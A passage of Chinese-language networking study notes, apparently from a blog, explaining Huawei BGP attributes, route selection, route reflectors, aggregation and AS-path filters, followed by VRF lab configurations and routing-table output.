1.1.1.1/32 45.1.1.4 0 200 100i *&gt; 5.5.5.5/32 0.0.0.0 0 0 i *&gt; 10.1.0.0/24 45.1.1.4 0 200 100? *&gt; 10.1.1.0/24 45.1.1.4 0 200 100? *&gt; 10.1.2.0/24 45.1.1.4 0 200 100? *&gt; 10.1.3.0/24 45.1.1.4 0 200 100?所经过的AS路径信息越靠近后,靠近始发侧新的AS号在前---[R5-bgp]display bgp routing-table peer 56.1.1.6 advertised-routes BGP Local router ID is 5.5.5.5 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 6 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 1.1.1.1/32 56.1.1.5 0 300 200 100i *&gt; 5.5.5.5/32 56.1.1.5 0 0 300i *&gt; 10.1.0.0/24 56.1.1.5 0 300 200 100? *&gt; 10.1.1.0/24 56.1.1.5 0 300 200 100? *&gt; 10.1.2.0/24 56.1.1.5 0 300 200 100? *&gt; 10.1.3.0/24 56.1.1.5 0 300 200 100? Next-hopnext-hop: 下一跳地址是一个公认必遵属性, 描述路由到达目标网络的下一台设备的 IP 地址.当 BGP 设备收到路由时如果下一跳地址是不可达的, 则路由不会被调优. 在不同场景中, 设备对缺省的 Next-hop 属性设置规则也是不同的: 1.BGP 设备向 EBGP 对等体发布路由时, 会把该路由的下一跳属性设置为本地与对端建立 BGP PEER 接口的地址. 2.BGP 设备将本地始发的路由发布给 IBGP 对等体, 会将路由的下一跳设置为本地与对端建立 IBGP PEER 接口的地址. 3. 如果从其他 EBGP 学习的路由在通告给 IBGP PEER 时会保持 Next-hop 属性不变 4. 如果路由器收到 BGP 路由, 该路由的 Next-hop 字段与 EBGP 对等体在同一个 IP 子网, 那么该路由通告给 EBGP PEER 时不修改 Next-hop 属性. [R1-bgp]display bgp routing-table BGP Local router ID is 1.1.1.1 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 2 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 1.1.1.1/32 0.0.0.0 0 0 i *&gt; 2.2.2.2/32 12.1.1.2 0 0 200i&lt;R2&gt;display bgp routing-table BGP Local router ID is 2.2.2.2 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 2 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 1.1.1.1/32 12.1.1.1 0 0 100i *&gt; 2.2.2.2/32 0.0.0.0 0 0 i&lt;R2&gt;[R3-bgp]display bgp routing-table BGP Local router ID is 3.3.3.3 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 3 Network NextHop MED LocPrf PrefVal Path/Ogn i 1.1.1.1/32 1.1.1.1 0 100 0 i i 2.2.2.2/32 12.1.1.2 0 100 0 200i *&gt;i 11.1.1.1/32 1.1.1.1 0 100 0 i[R2-bgp]display bgp routing-table BGP Local router ID is 2.2.2.2 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 3 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 1.1.1.1/32 12.1.1.1 0 0 100i *&gt; 2.2.2.2/32 0.0.0.0 0 0 i *&gt; 11.1.1.1/32 12.1.1.1 0 0 100i Local-preference本地优先级属性Local-preference: 本地优先级属性，公认任意属性, 用于在 AS 内来确定流量的出口路径。在 AS 内的本地优先级越大越优，缺省值 100，只能在 AS 内传递 【本地优先级属性用于在 BGP AS 内控制出向流量，当 AS 内, 存在多个出口时，可以通过控制本地优先级属性实现流量路径的选择，优先级越大越优，优先级默认值为 100.】 本地优先级的注意事项：本地优先级只能在 IBGP 对等体之间传递，而不能在 EBGP 对等体之间传递，如果在 EBGP 对等体之间收到了携带本地优先级属性的路由，则进行错误处理。 可以在 AS 边界路由器上使用 import 方向的策略来修改 local preference 属性值。也就是在收到路由之后在本地为路由赋予 local preference。 [R3-bgp]default local-preference 110 // 更改本地优先级 MEDMED（multi-exit）： 多出口标识（多出口鉴别器）可选非过度属性 是一种度量值，可以用于控制入向流量，MED 数值越小 BGP 路由越优, 缺省情况下不携带 MED 值 (不携带为 0) [R3]route-policy set-med permit node 10 // 创建策略[R3-route-policy]apply cost 30 // 更改MED值[R3-bgp]peer 13.1.1.1 route-policy set-med export // 在BGP应用 在 AS 出口中可以将 IGP 的注入进 BGP，此时 IGP 的 metric 会被添加进 BGP MED 属性，并通告给 EBGP peer，EBGP 对等体可以根据 MED 值或者该路由的 IGP 情况进行选路. [R2-GigabitEthernet0/0/1]ospf cost 15 // 更改接口ospf 开销值 缺省情况下 BGP 设备只会比较来自同一个相邻 AS 的 MED 值，可以通过命令 [R1-bgp] compare-different-as-med 让路由器比较来自不同 AS 路由的 MED 值 MED 作用： 在 AS 之间控制入向流量的属性，属性仅在 AS 之间传递，收到此属性的 AS 不会再通告给任何第三方 AS. 路由在通告进 BGP 设备时，路由会将 metric 加入到 MED 属性中，通过 MED 值反应路由的变化类似于 BGP metric，数值越小越优先，不同的 IGP 引入的 MED 无法比较. 如果是本地始发路由，MED 值会被通告给 IBGP 和 EBGP. 如果是从其他的 BGP 对等体学习的路由，则 MED 值只能通告给 IBGP 对等体，不会通告给 EBGP 对等体.MED 值只能影响相邻的 AS 选路. MED 更加灵活，当开销发生变动时，MED 也会随之改变 CommunityCommunity: 团体属性, 是 BGP 路由中的一种标记信息, 使用可以将一些相同策略的路由进行相同的标记加以区分. 从而便于后续的策略执行, 是一个可选过渡属性, 共 32bit 有两种表示形式: 十进制数形式 AA:NN 其中 AA 是 16bit,NN 也为 16bit. 一般情况下, AA 可以使用路由对应的 AS 号, NN 为管理员自定义的标记信息. 常见的 Community 可以分为 2 类: 公认 Community: 1.internet:0x00000000 表示缺省的 Community 信息, 默认路由器对该 Community 不做任何的动作. 2.no-advertise:0xFFFFFF02 表示该路由不会通告给任何的 BGP PEER. 3.no-export:0xFFFFFF01 表示该路由不会发出本 AS, 表示不会通告给 EBGP PEER. 4.no-export-subconfed:0xFFFFFF03 表示该路由不会传出联盟子 AS, 同时也不会向其他 AS 传递. 私有 Community Community-filter: 用于匹配 BGP 中 Community 信息的工具 基本的 filter 范围: 1-99 高级的 filter 范围: 00-199 [R3]ip community-filter ? INTEGER&lt;1-99&gt; Community-filter number (basic) INTEGER&lt;100-199&gt; Community-filter number (advanced) advanced Advanced community-filter basic Basic community-filter[R3]ip community-filter 1 permit 100:100[R3]ip community-filter 2 permit 100:200----通告Community[R1-bgp]peer 12.1.1.2 advertise-community [R1-acl-basic-2001]dis current-configuration configuration acl-basic acl number 2000 rule 5 permit source 10.1.0.0 0. 0.255.255 acl number 2001 rule 5 permit source 20.1.0.0 0.0.255.255 [R1-route-policy]dis throute-policy set-com permit node 10 if-match acl 2000 apply community 100:100 #route-policy set-com permit node 20 if-match acl 2001 apply community 100:200 [R1-bgp]peer 12.1.1.2 route-policy set-com export [R1-bgp]peer 12.1.1.2 advertise-community[R2]dis bgp routing-table community 100:100---[R2-bgp]peer 23.1.1.3 advertise-community[R2-bgp]peer 24.1.1.4 advertise-community[R3]ip community-filter 1 permit 100:100[R3]ip community-filter 2 permit 100:200[R4]ip community-filter 1 permit 100:100[R4]ip community-filter 2 permit 100:200[R3-route-policy]dis throute-policy set-lp permit node 10 if-match community-filter 1 apply local-preference 110 #route-policy set-lp permit node 20 if-match community-filter 2 apply local-preference 50 [R4-route-policy]dis throute-policy set-lp permit node 10 if-match community-filter 1 apply local-preference 50 #route-policy set-lp permit node 20 if-match community-filter 2 apply local-preference 110 bgp 300peer x.x.x.x route-policy set-lp import[R3-bgp]peer 23.1.1.2 route-policy set-lp import[R4-bgp]peer 24.1.1.2 route-policy set-lp import BGP 选路原则0.BGP 路由的下一跳地址不可达, 则路由不会被调优. 1.preferred-value (首选值) 数值越高, 路由越优. 是华为设备私有的属性, 只能用于 BGP 本地路由控制, 该属性不会出现在 update 报文中. 缺省值为 0 2. 优选 local-Preference 属性值较高的路由. 3. 本地始发的路由, 优于非本地始发路由. 聚合路由优于非聚合路由 手动聚合 &gt; 自动聚合 &gt; network &gt; import &gt; 非本地始发 4. 优选 AS_PATH 路径较短的路由. 5. 优选 origin 最优的路由 i&gt;e&gt;? 6. 优选 MED 数值较小的路由 7. 优选从 EBGP 学习的路由 (EBGP 优于 IBGP 路由) 8. 优选 next-hop 的 IGP 度量值最小的路由 8.5 BGP 设备不开启负载均衡, 如果开启了负载均衡条件, 且前 8 条内容一致, 则实现负载均衡. 9. 优选 cluster_list 较短的路由. 10. 优选 RID (originator-id) 较小路由. 11. 优选具有最小 IP 地址的对等体通告的路由. BGP 路由反射器由于 IBGP 水平分割规则的存在, AS 内部如果需要构建 IBGP 全互联, 则需要维护大量的 TCP 连接以及 BGP 邻居关系, 尤其当路由器数量较多时, 会导致扩展性变差, 难以维护. 此时可以通过 BGP 的路由反射器技术来简化 BGP 的邻居关系建立. BGP 路由反射器可以降低水平分割发送路由的限制, 让一部分 IBGP 的路由可以发送给 IBGP PEER. BGP 路由反射器中的角色RR (rouote reflector):路由反射器 client:RR 的客户机 non-cient:RR 的非客户机 路由反射规则当 RR 接收到 BGP 路由时, 如果是反射器从自己的非客户机收到的, 则会将其反射给所有的客户机 如果是从客户机收到的路由, 则会反射给所有的非客户机和客户机. 如果从 EBGP PEER 收到的路由，则发送给所有 BGP PEER. peer x.x.x.x reflect-client [R1-bgp]peer 2.2.2.2 reflect-client[R1-bgp]peer 3.3.3.3 reflect-client 反射器簇一个路由器与其所有的客户机形成一个路由反射器簇. 在一个 AS 内一个路由器有可能属于多个不同的簇. 路由器在不同的簇内角色可能不同 起源者 IDOriginator: 起源者 ID, 用于反射器簇内防环, 是一个可选非过渡属性, 当路由反射器第一次反射路由时, 反射器会将路由发起者的 RID 添加至该属性, 在后续传递过程中该属性不变, BGP 设备收到路由时会将起源者 ID 和自身的 RID 进行对比, 如果不一致, 则正常接收处理该路由, 如果一致, 则拒绝接收该路由. 簇 id簇 id: 簇 id 是反射器簇的标识, 具备相同簇 id 的反射器在同一个簇内, 如果没有配置簇 id, 则缺省用设备的 RID 作为族 id. [R1-bgp]reflector cluster-id x.x.x.x // 手动设置更改簇id Cluster_id listCluster_id list: 簇 id 列表, 用于在 BGP 路由反射器簇直接进行防环, 是一个可选非过渡属性, 当路由器第一次反射路由时, 反射器会创建该属性, 并将自身的簇 id 添加到列表中. 当路由反射器接收到携带簇 id 列表的路由时, 会检查列表是否包含自身的簇 id 信息, 如果不包含, 则正常接收处理, 如果包含自身的族 id, 则拒绝接收该路由. BGP 路由聚合BGP 路由聚合: 可以将多个 BGP 路由聚合成一条路由, 从而减少 BGP 传递的路由条目. 来提升 BGP 传输的效率. 自动聚合: 将本地 import 命令引入的路由自动聚合成主类网络. 默认会抑制明细路由, 只有主类网络会被通告出去. 手工聚合: 可以将 BGP 表中任意的路由聚合成任意长度, 可以实现更灵活的路由聚合. 默认不抑制明细路由. detail-suppressed: 可以通过该参数将明细路由进行抑制. as-set: 将明细路由的 AS 无序添加到 AS_PATH 中, 用于聚合后的路由防环. attribute-policy: 在聚合后将某些属性添加到聚合路由中. origin-policy: 起源策略, 用于匹配路由起源, 只有匹配起源策略的路由才会被聚合. suppress-policy: 在进行路由聚合时, 可以通过抑制策略选择被抑制的路由, 未被抑制的路由可以正常的被通告. 自动聚合 [R1-bgp]summary automatic------手工聚合10.1.0.0/24 0000 000010.1.1.0/24 0000 000110.1.2.0/24 0000 001010.1.3.0/24 0000 001110.1.4.0/24 0000 010010.1.5.0/24 0000 010110.1.6.0/24 0000 011010.1.7.0/24 0000 011110.1.0.0/21 0000 0000[R5-bgp]aggregate 10.1.0.0 21-----detail-suppressed[R5-bgp]aggregate 10.1.0.0 255.255.248.0 ? as-set Generate the route with AS-SET path-attribute attribute-policy Set aggregation attributes detail-suppressed Filter more detail route from updates origin-policy Filter the originate routes of the aggregate suppress-policy Filter more detail route from updates through a Routing policy &lt;cr&gt; [R5-bgp]aggregate 10.1.0.0 255.255.248.0 detail-suppressed [R5-bgp]aggregate 10.1.0.0 255.255.248.0 detail-suppressed as-set[R5]route-policy set-com permit node 10[R5-route-policy]apply community 100:100[R5-bgp]aggregate 10.1.0.0 255.255.248.0 detail-suppressed as-set attribute-policy set-comWarning: set-com used as BGP attribute-policy, apply as-path is not supported.[R5-bgp]dis bgp r community Total Number of Routes: 1 Network NextHop MED LocPrf PrefVal Community *&gt; 10.1.0.0/21 127.0.0.1 0 &lt;100:100&gt;----origin-policy[R1]route-policy set-com permit node 10[R1-route-policy]apply community 100:1[R1-bgp]import-route static route-policy set-com [R1-bgp]peer 100.1.1.5 advertise-community[R5]ip community-filter 1 permit 100:1[R5]route-policy ori-policy permit node 10[R5-route-policy]if-match community-filter 1[R5-bgp]aggregate 10.1.0.0 255.255.248.0 as-set detail-suppressed attribute-policy set-com origin-policy ori-policy[R5-bgp]dis bgp routing-table community BGP Local router ID is 5.5.5.5 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 9 Network NextHop MED LocPrf PrefVal Community *&gt; 10.1.0.0/21 127.0.0.1 0 &lt;100:100&gt; s&gt; 10.1.0.0/24 100.1.1.1 0 0 &lt;100:1&gt; s&gt; 10.1.1.0/24 100.1.1.1 0 0 &lt;100:1&gt; s&gt; 10.1.2.0/24 100.1.1.2 0 0 &lt;100:1&gt; s&gt; 10.1.3.0/24 100.1.1.2 0 0 &lt;100:1&gt; *&gt; 10.1.4.0/24 100.1.1.3 0 0 &lt;100:2&gt; *&gt; 10.1.5.0/24 100.1.1.3 0 0 &lt;100:2&gt; *&gt; 10.1.6.0/24 100.1.1.4 0 0 &lt;100:2&gt; *&gt; 10.1.7.0/24 100.1.1.4 0 0 &lt;100:2&gt;----suppress-policy10.1.0000 0 001.0/2410.1.0000 0 011.0/2410.1.0000 0 0X0.0 0.0.2.0[R5-acl-basic-2000]rule per source 10.1.1.0 0.0.2.0[R5-route-policy]dis throute-policy sup-policy permit node 10 if-match acl 2000[R5-bgp]aggregate 10.1.0.0 255.255.248.0 as-set detail-suppressed origin-policy ori-policy attribute-policy set-com suppress-policy sup-policy[R5-bgp]dis bgp routing-table community Network NextHop MED LocPrf PrefVal Community *&gt; 10.1.0.0/21 127.0.0.1 0 &lt;100:100&gt; *&gt; 10.1.0.0/24 100.1.1.1 0 0 &lt;100:1&gt; s&gt; 10.1.1.0/24 100.1.1.1 0 0 &lt;100:1&gt; *&gt; 10.1.2.0/24 100.1.1.2 0 0 &lt;100:1&gt; s&gt; 10.1.3.0/24 100.1.1.2 0 0 &lt;100:1&gt; *&gt; 10.1.4.0/24 100.1.1.3 0 0 &lt;100:2&gt; *&gt; 10.1.5.0/24 100.1.1.3 0 0 &lt;100:2&gt; *&gt; 10.1.6.0/24 100.1.1.4 0 0 &lt;100:2&gt; *&gt; 10.1.7.0/24 100.1.1.4 0 0 &lt;100:2&gt; 策略修改 AS_PATHroute-policy add-as permit node 10 apply as-path 123 addiviteroute-policy add-as2 permit node 10 apply as-path 123 overwrite[R2-bgp]peer 23.1.1.3 route-policy add-as export AS-path-filterAS-path-filter: AS 路径过滤器, 是 BGP 中一个特有的过滤器, 可以与路由策略配合使用, 对 BGP 的路由进行过滤或属性的调整. AS-path-filter 在使用时通过正则表达式对 BGP 路由中的 AS - PATH 属性进行配置 正则表达式符号^:起始符, 表示一个字符串开始 ^1010 20 3010 11 12100 110 120 $:结束符, 表示一个字符串的结束. 10$30 20 10120 110 _:匹配任意一个符号, 包括括号和空格. _100$ 从AS100始发的路由 .:可以用于匹配任意的单个字符, 包括空格. 0.10x10110210 1 +:用于匹配前面的序列, 可以出现 1 次或多次. 12+121221222 *:用于匹配前面的序列, 可以出现 0 次或多次. 12*1121221222 ? :用于匹配前面的序列, 可以出现 0 次或 1 次. 12?112 () : 一个序列优先计算, 一般可以与 | 配合使用. | : 逻辑或 12(3|4)561235612456 [] : 用于匹配一个序列的范围, 一般可以与 - 配合使用. -: 连接符, 一般用于表示一个序列范围. 12[3456] 等同于 12[3-6] 123124125126 正则表达式举例: ^100$ : 从相邻的 AS 100 始发的路由. ^$ : 本 AS 始发的路由. _100$ : 从 AS100 始发的路由 ^100_ : 从相邻的 AS 100 传入的路由. _100_ : 途径 AS 100 的路由. .*:匹配任意的 BGP 信息 ^[0-9]+$ : 从相邻 AS 始发的路由. [0-9][0-9][0-9][0-9][0-9] 需求1: 在R6中过滤掉始发于AS200 的路由[R6-bgp]dis bgp routing-table Total Number of Routes: 6 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 10.1.1.0/24 56.1.1.5 0 500 400 100? *&gt; 20.1.1.0/24 56.1.1.5 0 500 300 200? *&gt; 30.1.1.0/24 56.1.1.5 0 500 300? *&gt; 40.1.1.0/24 56.1.1.5 0 500 400? *&gt; 50.1.1.0/24 56.1.1.5 0 0 500? *&gt; 60.1.1.0/24 0.0.0.0 0 0 ?[R6]ip as-path-filter deny_200 deny ? TEXT A regular-expression of 1 to 255 characters for matching AS_Path attributes[R6]ip as-path-filter deny_200 deny _200$ // 拒绝始发于 AS200 的路由[R6]ip as-path-filter deny_200 permit .* // 未匹配的路由默认为拒绝,这里修改为放行[R6-bgp]peer 56.1.1.5 as-path-filter deny_200 ? export Egress distribution list import Ingress distribution list[R6-bgp]peer 56.1.1.5 as-path-filter deny_200 import // BGP 调用 as-path-filter[R6-bgp]dis bgp routing-table Total Number of Routes: 5 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 10.1.1.0/24 56.1.1.5 0 500 400 100? *&gt; 30.1.1.0/24 56.1.1.5 0 500 300? *&gt; 40.1.1.0/24 56.1.1.5 0 500 400? *&gt; 50.1.1.0/24 56.1.1.5 0 0 500? *&gt; 60.1.1.0/24 0.0.0.0 0 0 ?----AS200始发的路由 MED 修改为 50[R2-bgp]dis bgp routing-table Total Number of Routes: 9 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 10.1.1.0/24 12.1.1.1 0 0 100? *&gt; 20.1.1.0/24 0.0.0.0 0 0 ? *&gt; 30.1.1.0/24 23.1.1.3 0 0 300? *&gt; 40.1.1.0/24 12.1.1.1 0 100 400? * 23.1.1.3 0 300 500 400? *&gt; 50.1.1.0/24 23.1.1.3 0 300 500? * 12.1.1.1 0 100 400 500? *&gt; 60.1.1.0/24 23.1.1.3 0 300 500 600? * 12.1.1.1 0 100 400 500 600?[R2]ip as-path-filter AS200 permit ^$ // 本AS始发的路由[R2-route-policy]dis throute-policy set-med permit node 10 if-match as-path-filter AS200 apply cost 50[R2-bgp]import-route static route-policy set-med [R2-bgp]dis bgp routing-table Total Number of Routes: 9 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 10.1.1.0/24 12.1.1.1 0 0 100? *&gt; 20.1.1.0/24 0.0.0.0 50 0 ? *&gt; 30.1.1.0/24 23.1.1.3 0 0 300? *&gt; 40.1.1.0/24 12.1.1.1 0 100 400? * 23.1.1.3 0 300 500 400? *&gt; 50.1.1.0/24 23.1.1.3 0 300 500? * 12.1.1.1 0 100 400 500? *&gt; 60.1.1.0/24 23.1.1.3 0 300 500 600? * 12.1.1.1 0 100 400 500 600?------- BGP 对等体组BGP 对等体组: 是一些具有相同策略的对等体的集合, 当一个对等体加入对等体组中, 该对等体将获得与所在 BGP 对等体组相同的配置, 当对等体组的配置改变时, 组内成员的配置也相应改变. 在大型 BGP 网络中, 由于对等体的数量很多, 其中很多对等体具有相同的策略, 在配置时会重复使用一些命令, 利用对等体组可以简化配置. group ibgp internalpeer ibgp connect-interface LoopBack0peer ibgp password simple huawei123peer ibgp reflect-clientpeer ibgp next-hop-localpeer x.x.x.x group ibgp----group ebgp externalpeer ebgp as-number 300peer ebgp ebgp-max-hop 2peer ebgp connect-interface LoopBack0peer ebgp password simple huawei123peer x.x.x.x group ebgp"},{"title":"","date":"2024-03-11T03:00:00.000Z","updated":"2024-03-11T03:00:00.000Z","comments":true,"path":"notes/datacom/25.html","permalink":"https://blog.mhuig.top/notes/datacom/25","excerpt":"","text":"VRF 虚拟路由转发 VRF 虚拟路由转发 VRFVRF: 虚拟路由转发, 在三层将路由环境分割成多个虚拟环境, 每个虚拟环境之间都是完全隔离的. 通过用于 MPLS VPN 以及 VRF 中实现应用的隔离. 又称为 VPN 实例, 是一种虚拟化技术, 每个 VPN 实例拥有独立的接口, 路由表和路由协议进程. 应用场景公司具备两张网络, 管理网络和生产网络, 此时如果两个网络需要隔离可以采用如下方案: 1. 通过 ACL 实现隔离: 缺点: 配置繁琐, 扩展性较差. 无法解决两张网络中网段重叠的问题 2. 物理隔离: 缺点: 需要增加新的设备, 造成额外的投入成本. 3.VRF: 通过部署虚拟实例, 让两个网络完全隔离, 并且无需增加新的设备投入. VRF 实现过程VRF 是对物理设备的一个逻辑划分. 每个逻辑单元称为一个 VPN 实例, 实例之间在路由层面上是完全隔离的 1. 创建实例, 并且将三层接口绑定到实例中. ip vpn-instance XXXXipv4-family interface GigabitEthernet0/0/x ip binding vpn-instance XXXX 2. 配置实例绑定的路由信息. ip route-static vpn-instance GUANLI 2.2.2.2 24 12.1.1.2ip route-static vpn-instance SHENGCHAN 3.3.3.3 24 13.1.1.3 3. 基于与实例绑定的接口和路由协议建立路由转发表, 并依据该转发表来转发数据. 在 VRF 中如果需要使用 ping 或 tracert 命令, 需要注意添加对应的 VPN 实例名, 否则默认会根据 public 路由表来进行查表. ping -vpn-instance GUANLI 12.1.1.2 实验 - 静态#sysname R1#ip vpn-instance GUANLI ipv4-family#ip vpn-instance SHENGCHAN ipv4-family#interface GigabitEthernet0/0/0 ip binding vpn-instance GUANLI ip address 12.1.1.1 255.255.255.0#interface GigabitEthernet0/0/1 ip binding vpn-instance GUANLI ip address 10.1.1.1 255.255.255.0#interface GigabitEthernet0/0/2 ip binding vpn-instance SHENGCHAN ip address 20.1.1.1 255.255.255.0#interface GigabitEthernet0/0/3 ip binding vpn-instance SHENGCHAN ip address 13.1.1.1 255.255.255.0#ip route-static vpn-instance GUANLI 2.2.2.0 255.255.255.0 12.1.1.2ip route-static vpn-instance SHENGCHAN 3.3.3.0 255.255.255.0 13.1.1.3----------------------------------------#sysname R2#interface GigabitEthernet0/0/0 ip address 12.1.1.2 255.255.255.0#interface LoopBack0 ip address 2.2.2.2 255.255.255.255#ip route-static 10.1.1.0 255.255.255.0 12.1.1.1------------------------------------------#sysname R3#interface GigabitEthernet0/0/0 ip address 13.1.1.3 255.255.255.0#interface LoopBack0 ip address 3.3.3.3 255.255.255.255#ip route-static 20.1.1.0 255.255.255.0 13.1.1.1---------------------------------------------PC&gt;ping 2.2.2.2Ping 2.2.2.2: 32 data bytes, Press Ctrl_C to breakFrom 2.2.2.2: bytes=32 seq=1 ttl=254 time=47 msFrom 2.2.2.2: bytes=32 seq=2 ttl=254 time=47 msFrom 2.2.2.2: bytes=32 seq=3 ttl=254 time=62 msFrom 2.2.2.2: bytes=32 seq=4 ttl=254 time=31 msFrom 2.2.2.2: bytes=32 seq=5 ttl=254 time=62 ms--- 2.2.2.2 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 31/49/62 msPC&gt;------------------[R1]display ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 6 Routes : 6 Destination/Mask Proto Pre Cost Flags NextHop Interface 10.1.1.0/24 Direct 0 0 D 10.1.1.1 GigabitEthernet0/0/1 10.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 20.1.1.0/24 Direct 0 0 D 20.1.1.1 GigabitEthernet0/0/2 20.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/2 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0------------------------[R1]display ip routing-table vpn-instance SHENGCHANRoute Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: SHENGCHAN Destinations : 3 Routes : 3 Destination/Mask Proto Pre Cost Flags NextHop Interface 3.3.3.3/32 Static 60 0 RD 13.1.1.3 GigabitEthernet0/0/3 13.1.1.0/24 Direct 0 0 D 13.1.1.1 GigabitEthernet0/0/3 13.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/3 实验 - OSPF#sysname R1#ip vpn-instance GUANLI ipv4-family#ip vpn-instance SHENGCHAN ipv4-familyinterface GigabitEthernet0/0/0 ip binding vpn-instance GUANLI ip address 12.1.1.1 255.255.255.0#interface GigabitEthernet0/0/1 ip address 10.1.1.1 255.255.255.0#interface GigabitEthernet0/0/2 ip address 20.1.1.1 255.255.255.0#interface GigabitEthernet0/0/3 ip binding vpn-instance SHENGCHAN ip address 13.1.1.1 255.255.255.0#interface LoopBack0 ip address 1.1.1.1 255.255.255.255#ospf 1 router-id 1.1.1.1 vpn-instance GUANLI area 0.0.0.0 network 12.1.1.1 0.0.0.0 network 10.1.1.1 0.0.0.0#ospf 2 router-id 1.1.1.1 vpn-instance SHENGCHAN area 0.0.0.0 network 13.1.1.1 0.0.0.0 network 20.1.1.1 0.0.0.0----------------------------------------------------#sysname R2#interface GigabitEthernet0/0/0 ip address 12.1.1.2 255.255.255.0#interface LoopBack0 ip address 2.2.2.2 255.255.255.255#ospf 1 router-id 2.2.2.2 area 0.0.0.0 network 2.2.2.2 0.0.0.0 network 12.1.1.2 0.0.0.0----------------------------------------------------#sysname R3#interface GigabitEthernet0/0/0 ip address 13.1.1.3 255.255.255.0#interface LoopBack0 ip address 3.3.3.3 255.255.255.255#ospf 1 router-id 3.3.3.3 area 0.0.0.0 network 3.3.3.3 0.0.0.0 network 13.1.1.3 0.0.0.0------------------------------------------[R1]dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 7 Routes : 7 Destination/Mask Proto Pre Cost Flags NextHop Interface 1.1.1.1/32 Direct 0 0 D 127.0.0.1 LoopBack0 10.1.1.0/24 Direct 0 0 D 10.1.1.1 GigabitEthernet0/0/1 10.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 20.1.1.0/24 Direct 0 0 D 20.1.1.1 GigabitEthernet0/0/2 20.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/2 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R1]dis ip routing-table vpn-instance GUANLIRoute Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: GUANLI Destinations : 3 Routes : 3 Destination/Mask Proto Pre Cost Flags NextHop Interface 2.2.2.2/32 OSPF 10 1 D 12.1.1.2 GigabitEthernet0/0/0 12.1.1.0/24 Direct 0 0 D 12.1.1.1 GigabitEthernet0/0/0 12.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 实验 - 冲突[R1-GigabitEthernet0/0/0]ip add 10.1.1.1 24Mar 11 2024 15:45:28-08:00 R1 %%01IFNET/4/LINK_STATE(l)[0]:The line protocol IP on the interface GigabitEthernet0/0/0 has entered the UP state. [R1-GigabitEthernet0/0/0]int g0/0/1[R1-GigabitEthernet0/0/1]ip add 10.1.1.2 24Error: The specified address conflicts with another address.----------------------# sysname R1#ip vpn-instance vpna ipv4-family#ip vpn-instance vpnb ipv4-family#interface GigabitEthernet0/0/0 ip binding vpn-instance vpna ip address 10.1.1.1 255.255.255.0 #interface GigabitEthernet0/0/1 ip binding vpn-instance vpnb ip address 10.1.1.2 255.255.255.0 #interface LoopBack1 ip binding vpn-instance vpna ip address 11.1.1.1 255.255.255.255 #interface LoopBack2 ip binding vpn-instance vpnb ip address 11.1.1.2 255.255.255.255 ---------------------------------------PC&gt;ping 11.1.1.1Ping 11.1.1.1: 32 data bytes, Press Ctrl_C to breakFrom 11.1.1.1: bytes=32 seq=1 ttl=255 time=31 msFrom 11.1.1.1: bytes=32 seq=2 ttl=255 time=15 msFrom 11.1.1.1: bytes=32 seq=3 ttl=255 time=16 msFrom 11.1.1.1: bytes=32 seq=4 ttl=255 time=16 msFrom 11.1.1.1: bytes=32 seq=5 ttl=255 time=31 ms--- 11.1.1.1 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 15/21/31 ms 实验 - 旁挂防火墙#sysname R1#ip vpn-instance vpna ipv4-family#interface GigabitEthernet0/0/0 ip binding vpn-instance vpna ip address 10.1.1.1 255.255.255.0#interface GigabitEthernet0/0/1 ip address 100.1.1.1 255.255.255.0#interface GigabitEthernet0/0/2 ip address 12.1.1.1 255.255.255.0#interface GigabitEthernet0/0/3 ip binding vpn-instance vpna ip address 21.1.1.1 255.255.255.0#ip route-static 10.1.1.0 255.255.255.0 12.1.1.2ip route-static vpn-instance vpna 100.1.1.0 255.255.255.0 21.1.1.2-----------------------------------#sysname R2#interface GigabitEthernet0/0/0 ip address 12.1.1.2 255.255.255.0#interface GigabitEthernet0/0/1 ip address 21.1.1.2 255.255.255.0#ip route-static 10.1.1.0 255.255.255.0 21.1.1.1ip route-static 100.1.1.0 255.255.255.0 12.1.1.1#--------------------------------------PC&gt;ping 100.1.1.2Ping 100.1.1.2: 32 data bytes, Press Ctrl_C to breakFrom 100.1.1.2: bytes=32 seq=1 ttl=125 time=125 msFrom 